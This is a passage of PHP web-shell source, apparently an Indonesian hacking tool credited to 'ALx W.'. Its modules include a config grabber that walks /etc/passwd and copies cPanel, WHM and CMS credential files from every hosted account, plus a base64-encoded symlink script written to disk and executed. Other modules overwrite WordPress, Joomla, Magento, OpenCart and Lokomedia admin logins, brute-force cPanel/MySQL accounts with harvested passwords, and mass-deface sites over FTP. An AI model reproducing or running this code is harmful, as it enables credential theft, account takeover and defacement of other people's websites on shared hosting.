zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICJMb2NhdGlvbjogLi9cblxuIjs=";
		$file = "alx_config/vhost.cin";
		$handle = fopen($file ,"w+");
		fwrite($handle ,base64_decode($vhost));
		fclose($handle);
		chmod($file, 0755);
		if(exe("cd alx_config && ./vhost.cin")) {
			echo "<center><a href='$link_config/alx_config'><font color=blue>Done</font></a></center>";
		} else {
			echo "<center><a href='$link_config/alx_config/vhost.cin'><font color=blue>Done</font></a></center>";
		}

	} else {
		$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
		while($passwd = fgets($etc)) {
			if($passwd == "" || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_config);
				foreach($user_config[1] as $user_alx) {
					$user_config_dir = "/home/$user_alx/public_html/";
					if(is_readable($user_config_dir)) {
						$grab_config = array(
							"/home/$user_alx/.my.cnf" => "cpanel",
							"/home/$user_alx/.accesshash" => "WHM-accesshash",
							"$user_config_dir/po-content/config.php" => "Popoji",
							"$user_config_dir/vdo_config.php" => "Voodoo",
							"$user_config_dir/bw-configs/config.ini" => "BosWeb",
							"$user_config_dir/config/koneksi.php" => "Lokomedia",
							"$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
							"$user_config_dir/clientarea/configuration.php" => "WHMCS",
							"$user_config_dir/whm/configuration.php" => "WHMCS",
							"$user_config_dir/whmcs/configuration.php" => "WHMCS",
							"$user_config_dir/forum/config.php" => "phpBB",
							"$user_config_dir/sites/default/settings.php" => "Drupal",
							"$user_config_dir/config/settings.inc.php" => "PrestaShop",
							"$user_config_dir/app/etc/local.xml" => "Magento",
							"$user_config_dir/joomla/configuration.php" => "Joomla",
							"$user_config_dir/configuration.php" => "Joomla",
							"$user_config_dir/wp/wp-config.php" => "WordPress",
							"$user_config_dir/wordpress/wp-config.php" => "WordPress",
							"$user_config_dir/wp-config.php" => "WordPress",
							"$user_config_dir/admin/config.php" => "OpenCart",
							"$user_config_dir/slconfig.php" => "Sitelok",
							"$user_config_dir/application/config/database.php" => "Ellislab");
						foreach($grab_config as $config => $nama_config) {
							$ambil_config = file_get_contents($config);
							if($ambil_config == '') {
							} else {
								$file_config = fopen("alx_config/$user_alx-$nama_config.txt","w");
								fputs($file_config,$ambil_config);
							}
						}
					}		
				}
			}	
		}
	echo "<center><a href='?dir=$dir/alx_config'><font color=blue>Done</font></a></center>";
	}
	} elseif($_GET['go'] == 'csrf') {
?>      <html>
<title>CSRF EXPLOITER ONLINE</title>
<center><br><br><br><br>
<font color=Lavenda>*Note : Post File, Type : Filedata / awupload / awfile / awfiles / file / ajaxfup / files[] / qqfile / userfile / etc
<center>
<form method="post">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat Diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Lock!">
</form>
<?php
//tidak penting
     @$url = $_POST['url'];
     @$pf = $_POST['pf'];
     @$d = $_POST['d'];
if($d) {
    //govlock
   
    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload!'></form";
}
?>
</form>
</html>
<?php
 
} elseif($_GET['go'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=blue>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=blue>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=blue>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=blue>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_alx_jump) {
					$user_jumping_dir = "/home/$user_alx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=blue>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=blue>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>tidak bisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_alx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
} elseif($_GET['go'] == 'auto_edit_user') {
	if($_POST['launch']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, tidak bisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=blue>sukses edit user, silahkan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, tidak bisa ambil nama domain nya</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=blue>sukses edit user, silahkan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, tidak bisa ambil nama domain nya</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=blue>sukses edit user, silahkan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, tidak bisa ambil nama domain nya</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=blue>sukses edit user, silahkan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, tidak bisa ambil nama domain nya</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, tidak	bisa ambil nama domain nya</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>tidak tahu admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>tidak tahu admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, tidak bisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=blue>sukses edit user, silahkan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='alxwahid' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='512536@' placeholder='pass_baru'><br>
		<input type='submit' name='launch' value='LAUNCH!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
	} elseif($_GET['go'] == 'cp_findcrack') {
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}

echo '<html><head>
<meta content="text/html; charset=utf-8">
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
</head><body>';

echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here!</a></td></tr>";
$dc++;
}

}
}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total cP Found = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Click Here!</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
				}
            }
			}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total cP Found = '.$total.'</h3><br />';
echo '</center>';

}
}else{
echo "<div class='result'><i><font color='#FF0000'>ERROR</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf</font> Not Accessible!</i></div>";
		}
} elseif($_GET['go'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>tidak bisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=blue>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=blue>$ucp</font>) password (<font color=blue>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses get ".$i." Cpanel by <font color=blue>ALx W.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get pass ( pakai db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['go'] == 'cpftp_auto') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							//
						} else {
							echo "[+] username (<font color=blue>$ucp</font>) password (<font color=blue>$pcp</font>)<br>";
							$ftp_conn = ftp_connect($ip);
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=red>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=blue>Login Sukses</font><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=blue>Deface Sukses</font><br>";
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>tidak bisa ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = $user_cp_url['name'];
												if($user_cp_url == $ucp) {
													echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}
											}
										}
									} else {
										echo "[+] <font color=red>tidak bisa ambil nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=red>Deface Gagal</font><br><br>";
								}
							}
							//echo "username (<font color=blue>$ucp</font>) password (<font color=blue>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses deface ".$i." Cpanel by <font color=blue>ALx W.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		Filename: <br>
		<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-sudah-di-deface.com/filemu.php' style='width: 450px;'><br>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Launch'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get pass ( pakai db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
